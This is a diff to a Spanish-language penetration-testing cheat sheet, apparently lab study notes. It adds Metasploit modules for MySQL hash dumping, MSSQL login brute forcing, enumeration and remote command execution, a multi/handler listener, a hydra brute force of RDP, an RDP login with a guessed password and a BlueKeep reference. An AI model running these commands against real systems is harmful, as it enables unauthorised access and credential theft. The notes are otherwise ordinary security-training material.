@@ -167,6 +167,14 @@ Lista de palabras para ataques de fuerza bruta
 /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 ```
 
+##### Metasploit
+Utilidades de la herramienta todo terreno carnal
+
+```python
+use auxiliary/scanner/mysql/mysql_hashdump
+use auxiliary/scanner/mysql/mysql_login
+```
+
 ### MSSQL - 1433
 Microsoft SQL Server (MSSQL) es un sistema de gestión de bases de datos relacionales desarrollado por Microsoft. Opera en el puerto 1433, facilitando la comunicación entre aplicaciones y bases de datos, permitiendo el almacenamiento y acceso a datos estructurados, con énfasis en la integración con el ecosistema de Microsoft.
 
@@ -185,6 +193,20 @@ Lista de palabras para ataques de fuerza bruta
 
 ```python
 No hay en este caso
+```
+
+##### Metasploit
+Utilidades de la herramienta todo terreno carnal
+
+```python
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS IP set USER_FILE /root/Desktop/wordlist/common_users.txt
+set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
+set VERBOSE false
+use auxiliary/admin/mssql/mssql_enum
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+use auxiliary/admin/mssql/mssql_exec (set CMD whoami)
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
 ```
 
 ### WebDAV - 80/443
@@ -209,6 +231,13 @@ Lista de palabras para ataques de fuerza bruta
 
 ```python
 No hay en este caso
+```
+
+##### Metasploit
+Utilidades de la herramienta todo terreno carnal
+
+```python
+use exploit/multi/handler
 ```
 
 ### WinRm - 5985,5986 (this port no int common port 1000)
@@ -236,4 +265,29 @@ auxiliary/scanner/winrm/winrm_login
 auxiliary/scanner/winrm/winrm_cmd
 exploit/windows/winrm/winrm_script_exec (set FORCE_VBS true)
 use exploit/windows/winrm/winrm_script_exec (acceder al sistema)
+```
+
+### RDP 3389 | 3333
+El Protocolo de Escritorio Remoto (RDP) se utiliza para la administración remota de sistemas Windows. Opera en los puertos 3389 (predeterminado) y 3333, permitiendo a los usuarios conectarse a una máquina de forma remota para interactuar con su interfaz gráfica y ejecutar aplicaciones como si estuvieran localmente presentes en el sistema remoto.
+
+```python
+nmap -sV -sC IP
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://IP -s 3333
+xfreerdp /u:administrator /v:IP:3333 /p:qwertyuiop
+```
+
+#### Diccionarios
+Lista de palabras para ataques de fuerza bruta
+
+```python
+/usr/share/metasploit-framework/data/wordlists/common_users.txt
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.tx
+```
+
+##### Metasploit
+Utilidades de la herramienta todo terreno carnal
+
+```python
+Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep)
+post/windows/manage/enable_rdp (habilitar rdp em msfconsole
 ```
